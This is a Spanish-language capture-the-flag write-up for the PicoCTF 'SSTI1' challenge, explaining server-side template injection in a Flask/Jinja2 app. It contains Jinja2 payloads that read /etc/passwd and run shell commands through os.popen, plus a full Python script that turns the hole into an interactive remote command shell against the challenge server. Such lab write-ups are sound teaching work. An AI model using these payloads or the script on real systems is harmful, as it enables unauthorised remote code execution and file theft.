---
layout: single
title: SSTI1: PicoCTF
excerpt: "En este challenge explotaremos la vulnerabilidad *SSTI* (Server Side Template Injection) cual trata de una vulnerabilidad que cuando insertamos ciertos payloads (según la plantilla), se logren interpretar de forma insegura dentro de esta, y así procesada en el servidor, este challenge una el lenguaje Python con un motor de plantilla Jinja2."
date: 2026-01-21
classes: wide
header:
  teaser: /assets/images/pctf-writeup-ssti1/logo_ssti1.png
  teaser_home_page: true
  icon: /assets/images/picoCTF.webp
categories:
  - PicoCTF
  - Pentesting
  - Challenge
  - Web
tags:
  - writeup
  - challenge
  - HackingWeb
  - SSTI
  - Python-Jinja2
  - RemoteAccessRCE
  - scriptPython-AutomatedCommandOutput
---

## WRITE UP
Ejemplo: atlas:picoctf.net:51658 (víctima) TTL=  63 LINUX

### ANÁLISIS WEB: RECONOCNIMIENTO

Dentro de la página tenemos un párrafo que nos habla acerca de que podemos publicar cosas, seguido de un campo para introducir texto y enviarlo.

Vamos a ver como reacciona la página ante un texto normal.

Nos lo refleja en la pantalla la salida.

##### POSIBLES VULNERABILIDADES

Si probamos con *XSS* **(CROSS-SITE SCRIPTING)** nos lo reflejara pero en esta máquina no hay cookies para robar **(Cookie Hijacking)**, ni tampoco podemos hacer nada a nivel servidor.

``<script>alert(0);</script>``

### WHATWEB

Haremos un reconocimiento a nivel web mediante *whatweb* para escanear tecnologías, lenguaje... de la página para ver por donde nos podemos aprovechar.

Usa <span style="color:cyan">Python</span> por lo que en la mayoría de casos y si tenemos suerte, se puede acontecer un `Server Side Template Injection - SSTI`.

```bash
whatweb http://atlas:picoctf.net:51658/
```

Una búsqueda en Google sobre que es **Werkzeug**:

### VULNERABILIDAD: SSTI  (SERVER SIDE TEMPLATE INJECTION)
Viendo esto ya nos podemos ver cual va a ser el objetivo para explotar este challenge

### PYTHON: JINJA2 | TEST
Para saber como injectar código y así mismo que payload usar, nos iremos a este repositorio de GitHub cual contiene Payloads de todo: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/97cfeee270395a838802fa1fcb8a4d5ffc6d6b48/Server%20Side%20Template%20Injection#jinja2)

Si vamos siguiendo el repositorio nos deja una serie de inyecciones cuales pueden que sea vulnerables dependiendo de nuestra necesidad, la nuestra ahora es probar si es vulnerable.

Probamos {% raw %} `{{4*4}}` {% endraw %}, y si sale "16" quiere decir que es vulnerable.

Es vulnerable, efectivamente. Probamos con otro.

Probamos {% raw %} `{{7*'7'}}` {% endraw %}, y tendría que salir "7777777".

Se acontece la inyección, exitosamente. Esto ya nos dice que se trata de una **plantilla Jinja2** o un motor compatible con este.

### PYTHON: JINJA2 | READ REMOTE FILE

Ahora probaremos a intentar leer archivos a nivel sistema, cual sería muy crítico en caso que llegue a interpretarse.

Injectamos {% raw %} `python {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}` {% endraw %}
y nos debería leer el archivo <span style="color:lightblue">/etc/</span>**passwd**.

Nos lo lee exitosamente.

### PYTHON: JINJA2 |  REMOTE CODE EXECUTION (RCE)

Por último nos queda probar a ejecutar de forma remota comandos. Hay varios, así hay que ir probando.

Probamos con: (Este nos ejecutara el comando **id**) 

{% raw %} `python {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` {% endraw %}

Nos ejecuta el comando y encima estamos como usuario <span style="color:blue">root</span>.

### SCRIPT PYTHON: AUTOMATIZAR COMANDOS

Crearemos un script en **Python** para ejecutar comandos de forma más cómoda en nuestra shell, desde el servidor a nuestro máquina a nivel local.

Lo que necesitaremos es "**CTRL + ALT + I**" > Herramientas de Desarrollador > Network.
Enviaremos la solicitud del Payload para ejecutar el comando nuevamente y en "announce" copiaremos la URL a cual se hace la Petición.

También la solicitud que es la data que vamos a enviar, la necesitamos también.

Resultado del script en Python:

Formato copiable:
{% raw %}

````python
#!/usr/bin/env python3  
  
import requests  
import re #Librería para el manejo de expresiones regulares  
  
main_url = "http://rescued-float.picoctf.net:58464/announce" #Indicamos la URL principal  
  
while True: #Bucle infinito  
  
    user_input = input("[~] > ") #Tenemos que indicar el comando que comandos queremos ejecutar, que ira dentro de nuestro user_input  
  
    data_post = { #Indicar la Data que por POST vamos a enviar  
            "content": '{{self.__init__.__globals__.__builtins__.__import__("os").popen("' + user_input + '").read()}}' #El campo content valdrá el Payload que le pongamos.| los + no hacen falta  
    }  
  
    #print(data_post) Ver lo que vale post_data | no hace falta, solo para testear lo que vamos a enviar  
    r = [requests.post](http://requests.post/)(main_url, data=data_post) #Lanzar la solicitud por POST al servidor (main_url) y a nivel data, enviar la data definida, por POST  
    response = re.findall(r'align="center">(.*)</h1>', r.text, re.DOTALL)[0] #Indicar una regex a contemplar para la respuesta del lado del servidor. Entre parentesis indicamos la cadena y entre corchetes el primer elemento. Por último el dotall para que tenga en cuenta todos los saltos de línea.  
    print(response) #Mostrar la respuesta por parte del servidor, en este caso de response
````
{% endraw %}

### BANDERA

La bandera estará en la ruta actual.

```bash
cat flag
```

